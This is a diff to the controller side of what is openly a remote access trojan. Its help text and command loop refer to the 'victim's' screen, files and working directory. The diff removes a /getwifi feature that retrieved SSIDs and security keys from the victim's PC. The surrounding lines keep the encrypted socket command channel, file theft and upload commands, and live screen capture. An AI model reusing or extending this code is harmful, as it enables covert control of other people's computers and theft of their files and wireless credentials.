@@ -232,7 +232,6 @@ while True:
         \r  /stoplive                  Stop the live feed of victim's screen.
         \r  /sendfile                  Sends a file from the files directory in the victom's CWD directory.
         \r  /getfile                   Gets a file from the victim's CWD and puts it into the files directory.
-        \r  /getwifi                   Gets SSIDs and security keys from victim's PC.
         \r  /config                    Allows you to change the config file
         \r  /clear                     Clear screen.
         \r  /exit/quit/q               Close session and exit.
@@ -405,15 +404,10 @@ while True:
             receiver.stop_server()
             receiver = StreamingServer(IPAddr, 422)
             continue
-        if command == "/getwifi":
-            print(f"[{IMPORTANT}] Getting wifi profiles\n")
-            get_wifi = client_socket.recv(BUFFER_SIZE)
-            get_wifi = Fernet(key).decrypt(get_wifi).decode()
-            print(get_wifi)
         output = client_socket.recv(BUFFER_SIZE)
         output = Fernet(key).decrypt(output).decode()
         results, cwd = output.split(SEPARATOR)
-        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive" and command != "/getwifi" and command != "/OTP":
+        if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stoplive" and command != "/OTP":
             print(f"{GREEN}{results}{END}")
         else: continue
     except KeyboardInterrupt:
